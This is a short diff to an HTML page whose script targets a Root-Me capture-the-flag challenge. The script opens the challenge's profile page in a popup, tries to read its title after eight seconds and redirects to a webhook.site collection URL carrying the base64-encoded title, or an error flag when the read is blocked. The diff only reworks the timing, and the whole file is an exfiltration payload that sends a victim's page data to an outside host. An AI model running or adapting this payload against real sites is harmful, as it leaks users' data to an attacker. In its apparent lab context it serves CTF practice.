@@ -4,18 +4,17 @@
 </head>
 <body>
 <script>
-function sleep(milliseconds) {
-  var start = new Date().getTime();
-  for (var i = 0; i < 1e7; i++) {
-    if ((new Date().getTime() - start) > milliseconds){
-      break;
-    }
+var popup = window.open("http://challenge01.root-me.org:58003/profile", "popupWindow");
+
+setTimeout(() => {
+  try {
+    var title = popup.document.title;
+    window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?title=" + btoa(title);
+  } catch (e) {
+    console.error("Impossible d’accéder au document de la popup (cross-origin)", e);
+    window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?error=cross_origin";
   }
-}
-  
-popup = window.open("http://challenge01.root-me.org:58003/profile", "popupWindow");
-sleep(8000);
-window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?title=" + btoa(popup.document.title);
+}, 8000);
 </script>
 </body>
 </html>
